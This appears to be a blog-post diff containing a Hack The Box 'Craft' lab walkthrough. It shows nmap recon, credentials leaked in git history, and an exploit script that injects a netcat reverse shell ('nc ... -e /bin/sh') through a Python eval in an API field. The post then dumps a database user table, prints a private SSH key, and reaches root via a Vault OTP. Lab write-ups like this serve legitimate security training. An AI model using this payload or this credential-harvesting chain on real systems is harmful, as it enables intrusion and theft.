@@ -1,0 +1,414 @@
+---
+layout: post
+title:  "Hack The Box - Craft"
+date:   2020-01-05 02:08:00 +0800
+categories: hackthebox vault docker mysql
+---
+My first `Medium` box! Didn't think I was capable of doing it so soon haha. I saw that this box was retiring soon so I thought "why not"? Of course, I needed the help of the forums to guide me :P
+
+![](/assets/images/craft.png){:height="414px" width="615px"}
+
+# Configuration
+
+The operating systems that I will be using to tackle this machine is a Kali Linux VM.
+
+What I learnt from other writeups is that it was a good habit to map a domain name to the machine's IP address so as that it will be easier to remember. This can done by appending a line to `/etc/hosts`.
+
+{% highlight bash %}
+$ echo "10.10.10.110 craft.htb" >> /etc/hosts
+{% endhighlight %}
+
+# Reconnaissance
+
+Using `nmap`, we are able to determine the open ports and running services on the machine.
+{% highlight bash %}
+$ map -sV -sT -sC craft.htb
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-01-04 00:11 EST
+Stats: 0:00:12 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
+Connect Scan Timing: About 59.20% done; ETC: 00:11 (0:00:08 remaining)
+Stats: 0:00:37 elapsed; 0 hosts completed (1 up), 1 undergoing Script Scan
+NSE Timing: About 91.94% done; ETC: 00:12 (0:00:00 remaining)
+Nmap scan report for craft.htb (10.10.10.110)
+Host is up (0.25s latency).
+Not shown: 998 closed ports
+PORT    STATE SERVICE  VERSION
+22/tcp  open  ssh      OpenSSH 7.4p1 Debian 10+deb9u5 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 bd:e7:6c:22:81:7a:db:3e:c0:f0:73:1d:f3:af:77:65 (RSA)
+|   256 82:b5:f9:d1:95:3b:6d:80:0f:35:91:86:2d:b3:d7:66 (ECDSA)
+|_  256 28:3b:26:18:ec:df:b3:36:85:9c:27:54:8d:8c:e1:33 (ED25519)
+443/tcp open  ssl/http nginx 1.15.8
+|_http-server-header: nginx/1.15.8
+|_http-title: About
+| ssl-cert: Subject: commonName=craft.htb/organizationName=Craft/stateOrProvinceName=NY/countryName=US
+| Not valid before: 2019-02-06T02:25:47
+|_Not valid after:  2020-06-20T02:25:47
+|_ssl-date: TLS randomness does not represent time
+| tls-alpn: 
+|_  http/1.1
+| tls-nextprotoneg: 
+|_  http/1.1
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 49.33 seconds
+{% endhighlight %}
+
+# Enumeration (1)
+
+Not much can be done with the `ssh` service as we do not have any credentials on hand so lets come back to it later. As for the `https` service, maybe we can find some information on it ?
+
+![](/assets/images/craft1.png)
+
+Nothing much here except for the `API` and the `git` icon on the top right. Lets first check out the `API`.
+
+It was a link to `https://api.craft.htb/api/`, hence we had to add `api.craft.htb` to our `/etc/hosts` for the page to be resolved properly.
+
+{% highlight bash %}
+$ cat /etc/hosts
+...
+10.10.10.110 craft.htb api.craft.htb
+{% endhighlight %}
+
+![](/assets/images/craft2.png)
+
+After playing around with some of the different APIs, what caught my attention was `/auth/login`. Upon clicking on `Execute`, I was prompted for credentials.
+
+![](/assets/images/craft3.png)
+
+Since I did not have any credentials, I decided to put this on hold for now. Lets move on the `git` icon. It was a link to `https://gogs.craft.htb`, hence we need to modify our `/etc/hosts` again.
+
+{% highlight bash %}
+$ cat /etc/hosts
+...
+10.10.10.110 craft.htb api.craft.htb gogs.craft.htb
+{% endhighlight %}
+
+![](/assets/images/craft4.png)
+
+So this website is like a private github of some sort? By clicking on `Explore`, we are able to list all the public repositories, users and organisations on the website.
+
+![](/assets/images/craft5.png)
+
+Oh we found something! There is a repository that might be related to `https://api.craft.htb/api`!
+
+![](/assets/images/craft6.png)
+
+This repository seems to contain the source code. Lets try looking around.
+
+![](/assets/images/craft7.png)
+
+There was an issue posted which contained the API token, but sadly was expired. In the commits history, I found some credentials!
+
+![](/assets/images/craft8.png)
+
+Looks like Dinesh accidentally commited his credentials and tried to cover it up haha. To check if the credentials are still valid, we returned to `https://api.craft.htb/api/` and key them into the prompt for the `/auth/login` feature.
+
+![](/assets/images/craft9.png)
+
+We managed to get a valid API token! Not much can be done now so I decided to look at the source code for any vulnerabilites.
+
+# Exploitation (1)
+
+On `https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/api/brew/endpoints/brew.py`, there was a certain section that caught my eye.
+
+{% highlight python %}
+@ns.route('/')
+class BrewCollection(Resource):
+    ...
+    @auth.auth_required
+    @api.expect(beer_entry)
+    def post(self):
+        """
+        Creates a new brew entry.
+        """
+
+        # make sure the ABV value is sane.
+        if eval('%s > 1' % request.json['abv']):
+            return "ABV must be a decimal value less than 1.0", 400
+        else:
+            create_brew(request.json)
+            return None, 201
+{% endhighlight %}
+
+`eval` was being called with input from the `abv` field in the sent JSON for the `/brew/` route. This means that whatever `python` expression we enter in the `abv` field, it will be executed. Hm...
+
+I decided to search for how to achieve reverse shell from the `eval` function and I found this [post](https://stackoverflow.com/questions/59519289/python-running-reverse-shell-inside-eval) on StackOverflow.
+
+When `"__import__('os').system('nc 10.10.XX.XX -e /bin/sh')"` is inputted into `eval`, it will cause the box to connect back to us. I used the below `python` script to assist in the sending of the payload.
+
+{% highlight python %}
+import requests
+
+authtoken = requests.get('https://api.craft.htb/api/auth/login',  auth=('dinesh', '4aUh0A8PbVJxgd'), verify=False).json()["token"]
+
+exploit = {
+        'abv':"__import__(\'os\').system(\'nc 10.10.XX.XX 1337 -e /bin/sh\')",
+        "brewer": "string",
+        "name": "string",
+        "style": "string",
+}
+
+headers = {'X-Craft-Api-Token': authtoken}
+
+print(requests.post('https://api.craft.htb/api/brew/', json=exploit, headers=headers, verify=False).content)
+
+{% endhighlight %}
+
+With the script ready, we start our listener:
+
+{% highlight bash %}
+$ nc -lvnp 1337
+listening on [any] 1337 ...
+{% endhighlight %}
+
+And run our exploit script. Back on our listener, we catch the connection. Wait, we are already root?
+
+{% highlight bash %}
+listening on [any] 1337 ...                                         
+connect to [10.10.XX.XX] from (UNKNOWN) [10.10.10.110] 46345                       
+id 
+uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)
+{% endhighlight %}
+
+There was no `root.txt` at `/root`, so what is going on?
+
+# Enumeration (2)
+
+Lets try running [`LinEnum`](https://github.com/rebootuser/LinEnum) to get some insights.
+
+{% highlight bash %}
+$ mkdir httpserver
+$ cd httpserver
+$ cp ~/LinEnum.sh .
+$ python -m SimpleHTTPServer 80
+Serving HTTP on 0.0.0.0 port 80 ...
+{% endhighlight %}
+
+{% highlight bash %}
+wget http://10.10.XX.XX/LinEnum.sh
+chmod +x LinEnum.sh
+./LinEnum.sh
+...
+[+] Looks like we're in a Docker container:
+10:cpuset:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+9:freezer:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+8:memory:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+7:devices:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+6:pids:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+5:blkio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+4:perf_event:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+3:net_cls,net_prio:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+2:cpu,cpuacct:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+1:name=systemd:/docker/5a3d243127f5cfeb97bc6332eda2e4ceae19472421c0c5a7d226fb5fc1ef0f7c
+-rwxr-xr-x    1 root     root             0 Feb 10  2019 /.dockerenv
+{% endhighlight %}
+
+Ahh I see, we are in a Docker container. We might need to escape from it if we want to get our flags :P 
+
+Looking back at the repository on `https://gogs.craft.htb`, there was a `.gitignore`.
+
+{% highlight raw %}
+*.pyc
+settings.py
+{% endhighlight %}
+
+The `settings.py` seemed interesting. It was located at `/opt/app/craft_api` and it contained a lot of juicy information.
+
+{% highlight python %}
+# Flask settings
+FLASK_SERVER_NAME = 'api.craft.htb'
+FLASK_DEBUG = False  # Do not use debug mode in production
+
+# Flask-Restplus settings
+RESTPLUS_SWAGGER_UI_DOC_EXPANSION = 'list'
+RESTPLUS_VALIDATE = True
+RESTPLUS_MASK_SWAGGER = False
+RESTPLUS_ERROR_404_HELP = False
+CRAFT_API_SECRET = 'hz66OCkDtv8G6D'
+
+# database
+MYSQL_DATABASE_USER = 'craft'
+MYSQL_DATABASE_PASSWORD = 'qLGockJ6G2J75O'
+MYSQL_DATABASE_DB = 'craft'
+MYSQL_DATABASE_HOST = 'db'
+SQLALCHEMY_TRACK_MODIFICATIONS = False
+{% endhighlight %}
+
+Nice we got the credentials for a `mysql` database service running on the box. According to the model schema found at `https://gogs.craft.htb/Craft/craft-api/src/master/craft_api/database/models.py`, there is a `User` table containing usernames and passwords.
+
+We can modify this database testing script at `https://gogs.craft.htb/Craft/craft-api/src/master/dbtest.py` to dump out the table.
+
+{% highlight python %}
+#!/usr/bin/env python
+
+import pymysql
+from craft_api import settings
+
+# test connection to mysql database
+
+connection = pymysql.connect(host=settings.MYSQL_DATABASE_HOST,
+                             user=settings.MYSQL_DATABASE_USER,
+                             password=settings.MYSQL_DATABASE_PASSWORD,
+                             db=settings.MYSQL_DATABASE_DB,
+                             cursorclass=pymysql.cursors.DictCursor)
+
+try: 
+    with connection.cursor() as cursor:
+        sql = "SELECT `id`, `username`, `password` FROM `user`"
+        cursor.execute(sql)
+        result = cursor.fetchall()
+        for creds in result:
+            print(creds)
+
+finally:
+    connection.close()
+{% endhighlight %}
+
+Running the script gave us more credentials!
+
+{% highlight bash %}
+python dbtest_new.py
+{'id': 1, 'username': 'dinesh', 'password': '4aUh0A8PbVJxgd'}
+{'id': 4, 'username': 'ebachman', 'password': 'llJ77D8QFkLPQB'}
+{'id': 5, 'username': 'gilfoyle', 'password': 'ZEU3N8WNM2rh4T'}
+{% endhighlight %}
+
+Lets try logging in to `https://gogs.craft.htb` using these credentials.
+
+Only `dinesh`'s and `gilfoyle`'s credentials worked. However, in `gilfoyle`'s homepage I noticed another repository but was private.
+
+![](/assets/images/craft10.png)
+
+Looking through the repository, I found a `ssh` key pair at `https://gogs.craft.htb/gilfoyle/craft-infra/src/master/.ssh/id_rsa`
+
+
+# user.txt
+
+I downloaded the `id_rsa`, which is the private key.
+
+{% highlight raw %}
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABDD9Lalqe
+qF/F3X76qfIGkIAAAAEAAAAAEAAAEXAAAAB3NzaC1yc2EAAAADAQABAAABAQDSkCF7NV2Z
+F6z8bm8RaFegvW2v58stknmJK9oS54ZdUzH2jgD0bYauVqZ5DiURFxIwOcbVK+jB39uqrS
+zU0aDPlyNnUuUZh1Xdd6rcTDE3VU16roO918VJCN+tIEf33pu2VtShZXDrhGxpptcH/tfS
+RgV86HoLpQ0sojfGyIn+4sCg2EEXYng2JYxD+C1o4jnBbpiedGuqeDSmpunWA82vwWX4xx
+lLNZ/ZNgCQTlvPMgFbxCAdCTyHzyE7KI+0Zj7qFUeRhEgUN7RMmb3JKEnaqptW4tqNYmVw
+pmMxHTQYXn5RN49YJQlaFOZtkEndaSeLz2dEA96EpS5OJl0jzUThAAAD0JwMkipfNFbsLQ
+B4TyyZ/M/uERDtndIOKO+nTxR1+eQkudpQ/ZVTBgDJb/z3M2uLomCEmnfylc6fGURidrZi
+4u+fwUG0Sbp9CWa8fdvU1foSkwPx3oP5YzS4S+m/w8GPCfNQcyCaKMHZVfVsys9+mLJMAq
+Rz5HY6owSmyB7BJrRq0h1pywue64taF/FP4sThxknJuAE+8BXDaEgjEZ+5RA5Cp4fLobyZ
+3MtOdhGiPxFvnMoWwJLtqmu4hbNvnI0c4m9fcmCO8XJXFYz3o21Jt+FbNtjfnrIwlOLN6K
+Uu/17IL1vTlnXpRzPHieS5eEPWFPJmGDQ7eP+gs/PiRofbPPDWhSSLt8BWQ0dzS8jKhGmV
+ePeugsx/vjYPt9KVNAN0XQEA4tF8yoijS7M8HAR97UQHX/qjbna2hKiQBgfCCy5GnTSnBU
+GfmVxnsgZAyPhWmJJe3pAIy+OCNwQDFo0vQ8kET1I0Q8DNyxEcwi0N2F5FAE0gmUdsO+J5
+0CxC7XoOzvtIMRibis/t/jxsck4wLumYkW7Hbzt1W0VHQA2fnI6t7HGeJ2LkQUce/MiY2F
+5TA8NFxd+RM2SotncL5mt2DNoB1eQYCYqb+fzD4mPPUEhsqYUzIl8r8XXdc5bpz2wtwPTE
+cVARG063kQlbEPaJnUPl8UG2oX9LCLU9ZgaoHVP7k6lmvK2Y9wwRwgRrCrfLREG56OrXS5
+elqzID2oz1oP1f+PJxeberaXsDGqAPYtPo4RHS0QAa7oybk6Y/ZcGih0ChrESAex7wRVnf
+CuSlT+bniz2Q8YVoWkPKnRHkQmPOVNYqToxIRejM7o3/y9Av91CwLsZu2XAqElTpY4TtZa
+hRDQnwuWSyl64tJTTxiycSzFdD7puSUK48FlwNOmzF/eROaSSh5oE4REnFdhZcE4TLpZTB
+a7RfsBrGxpp++Gq48o6meLtKsJQQeZlkLdXwj2gOfPtqG2M4gWNzQ4u2awRP5t9AhGJbNg
+MIxQ0KLO+nvwAzgxFPSFVYBGcWRR3oH6ZSf+iIzPR4lQw9OsKMLKQilpxC6nSVUPoopU0W
+Uhn1zhbr+5w5eWcGXfna3QQe3zEHuF3LA5s0W+Ql3nLDpg0oNxnK7nDj2I6T7/qCzYTZnS
+Z3a9/84eLlb+EeQ9tfRhMCfypM7f7fyzH7FpF2ztY+j/1mjCbrWiax1iXjCkyhJuaX5BRW
+I2mtcTYb1RbYd9dDe8eE1X+C/7SLRub3qdqt1B0AgyVG/jPZYf/spUKlu91HFktKxTCmHz
+6YvpJhnN2SfJC/QftzqZK2MndJrmQ=
+-----END OPENSSH PRIVATE KEY-----
+{% endhighlight %}
+
+I attempted to `ssh` to the box. The passphrase was `ZEU3N8WNM2rh4T`, which was `gilfoyle`'s password.
+
+{% highlight bash %}
+$ chmod 600 id_rsa
+$ ssh -i id_rsa gilfoyle@craft.htb 
+Enter passphrase for key 'id_rsa': 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Sat Jan  4 12:04:33 2020 from 10.10.XX.XX
+gilfoyle@craft:~$ cat user.txt
+bbf4XXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+# Enumeration (3)
+
+In `gilfoyle`'s private repository, there was a folder called `vault`. Thinking it was a name for a service, I went to search online and found [this](https://www.vaultproject.io/).
+
+{% highlight raw %}
+A tool for secrets management, encryption as a service, and privileged access management.
+{% endhighlight %}
+
+In the folder, I found a script at `https://gogs.craft.htb/gilfoyle/craft-infra/src/master/vault/secrets.sh`
+
+{% highlight bash %}
+#!/bin/bash
+
+# set up vault secrets backend
+
+vault secrets enable ssh
+
+vault write ssh/roles/root_otp \
+    key_type=otp \
+    default_user=root \
+    cidr_list=0.0.0.0/0
+{% endhighlight %}
+
+Hmm... Seem like `vault` is being used to store `ssh` keys or something? Time to look at the [documentation](https://www.vaultproject.io/docs/secrets/ssh/one-time-ssh-passwords.html).
+
+# root.txt
+
+The commands looked pretty similar. Following the `Automate it` section, all we have to do is create a new OTP and `ssh` into the box.
+
+{% highlight bash %}
+vault ssh -role root_otp -mode otp root@127.0.0.1
+Vault could not locate "sshpass". The OTP code for the session is displayed
+below. Enter this code in the SSH password prompt. If you install sshpass,                                         
+Vault can automatically perform this step for you.                                                                 
+OTP for the session is: f80f58e4-6ec7-dcdf-b491-f2ee66a89260
+
+
+  .   *   ..  . *  *
+*  * @()Ooc()*   o  .
+    (Q@*0CG*O()  ___
+   |\_________/|/ _ \
+   |  |  |  |  | / | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | | | |
+   |  |  |  |  | \_| |
+   |  |  |  |  |\___/
+   |\_|__|__|_/|
+    \_________/
+
+
+
+Password: 
+{% endhighlight %}
+
+The password is simply just the OTP generated for the session, which is `f80f58e4-6ec7-dcdf-b491-f2ee66a89260`. 
+
+{% highlight bash %}
+Password: 
+Linux craft.htb 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64
+
+The programs included with the Debian GNU/Linux system are free software;
+the exact distribution terms for each program are described in the
+individual files in /usr/share/doc/*/copyright.
+
+Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
+permitted by applicable law.
+Last login: Tue Aug 27 04:53:14 2019
+root@craft:~# cat root.txt
+831dXXXXXXXXXXXXXXXXXXXXXXXXXXXX
+{% endhighlight %}
+
+
+Rooted ! Thank you for reading and look forward for more writeups and articles !
